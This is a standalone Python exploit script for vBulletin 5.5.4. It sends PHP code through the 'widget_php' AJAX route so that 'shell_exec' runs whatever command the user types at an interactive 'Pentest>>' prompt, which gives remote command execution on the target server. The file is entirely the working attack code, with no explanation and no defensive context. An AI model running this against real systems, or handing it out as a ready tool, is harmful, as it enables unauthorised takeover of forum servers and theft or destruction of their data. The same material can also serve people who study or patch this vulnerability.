#!/usr/bin/python
# exploit vBulletin version 5.5.4
import requests
import sys
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End
if len(sys.argv) != 2:
    sys.exit('exploit vBulletin' % sys.argv[0])

params ={"routestring":"ajax/render/widget_php"}

while True:
     try:
         cmd = input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin (vBulletin$)"+N+"): ")
         params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
         r = requests.post(url = sys.argv[1], data = params)
         if r.status_code == 200:
              print(r.text)
         else:
             sys.exit("Exploit failed!")
     except KeyboardInterrupt:
         sys.exit("\n Exitt...")
     except Exception as e:
         sys.exit(str(e))
